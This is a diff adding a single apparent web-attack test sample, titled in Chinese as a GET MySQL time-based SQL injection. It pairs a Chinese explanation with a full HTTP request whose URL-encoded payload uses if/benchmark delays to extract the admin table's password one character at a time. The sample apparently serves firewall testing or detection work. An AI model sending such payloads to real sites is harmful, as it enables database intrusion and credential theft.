@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_延时注入-06506262
+# 基于延时注入,该 SQL 注入语句的攻击目的是通过利用数据库的漏洞，尝试从 admin 表中获取管理员的密码，并检查密码的第一个字符的 ASCII 值是否为 103（'g' 的 ASCII 值）。攻击者利用 and 和 if 来执行条件判断，如果条件为真，则执行 benchmark(10000000,md5(0x41)) 进行基准测试，以检测数据库的性能和响应时间。通过这种方式，攻击者可以判断出数据库是否存在漏洞，并尝试获取敏感数据或执行其他恶意操作。
+GET /?id=1%20and%20if%28ascii%28substr%28%28select%20password%20from%20admin%20limit%200%2C1%29%2C1%2C1%29%29=103%2C%28benchmark%2810000000%2Cmd5%280x41%29%29%2C1%29&bid=hd_tag_m8mv24cr HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24cr
+RM-PRO-Token: e9a1b0a6cac9607169206035ac8a765e
+RM-PRO-Time: 1742808374978
+User-Agent: curl/7.83.1
+
